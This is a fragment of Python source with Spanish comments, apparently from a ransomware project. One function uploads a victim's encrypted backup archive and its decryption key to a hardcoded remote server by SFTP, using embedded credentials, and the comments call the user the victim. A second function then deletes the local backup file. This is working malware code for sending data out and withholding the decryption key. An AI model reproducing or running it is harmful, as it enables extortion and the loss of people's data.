# funcion para enviar al servidor el 'backup.zip' y 'decryption_key' y luego borrarlos
def send_sftp(current,user):
    zipfile_path = fr"{current}\{user}_cipher_backup.zip"
    key_filepath = fr"{current}\{user}_decryption_key.py"
    sftp_server = '54.37.204.180'
    sftp_username = 'cipher'
    sftp_password = 'entiadmin'
    time.sleep(.5)
    print("Creating SFTP Connection ...")
    transport = paramiko.Transport((sftp_server, 22))
    # conecta al servidor con las credenciales especificas
    transport.connect(username=sftp_username, password=sftp_password)
    time.sleep(.5)
    print("<Connected>")
    time.sleep(.5)
    print("Creating session..")
    sftp_connection = paramiko.SFTPClient.from_transport(transport)
    time.sleep(.5)
    print("Session successfully created")
    time.sleep(.5)
    print("Creating folder...")
    #intenta crear un directorio en el servidor con el nombre del usuario victima
    shared_folder = f"{user}"
    try:
        sftp_connection.mkdir(shared_folder)
    except FileExistsError:
        pass  
    time.sleep(1)
    print("Folder Created successfully")
    # cambia al directorio creado
    sftp_connection.chdir(shared_folder)
    time.sleep(1)
    print("Preparing to send files ...")
    sftp_connection.put(zipfile_path, os.path.basename(zipfile_path))
    time.sleep(1)
    sftp_connection.put(key_filepath, os.path.basename(key_filepath))
    print("Files Transfered successfully!!!")

    # cierra la conexion con el servidor despues de transferir los archivos
    time.sleep(3)
    print("Closing connection in 3 seconds..")
    sftp_connection.close()
    transport.close()
    time.sleep(1)
    print("Connection closed | Session Closed")
# envia los archivos al servidor
#send_sftp(current,user)

# funcion para borrar los archivos de backup y clave de descifrado
def erase_local_files(current,sysinfo,user):
    if sysinfo[0] == "Linux":
        os.remove(f"{current}/{user}_cipher_backup.zip")
        #os.remove(f"{current}/decryption_key.py")
    elif sysinfo[0] == "Windows":
        zipfile_extension = f"{user}_cipher_backup.zip"
        decryptionfile_extension = f"{user}_decryption_key.py"
        os.remove(fr"{current}\{zipfile_extension}")
        #os.remove(fr"{current}\{decryptionfile_extension}") <<<<<<<<<<<<<<<<<<<< delete or not the key for tests 
# elimina los archivos de backup y descifrado
erase_local_files(current,sysinfo,user)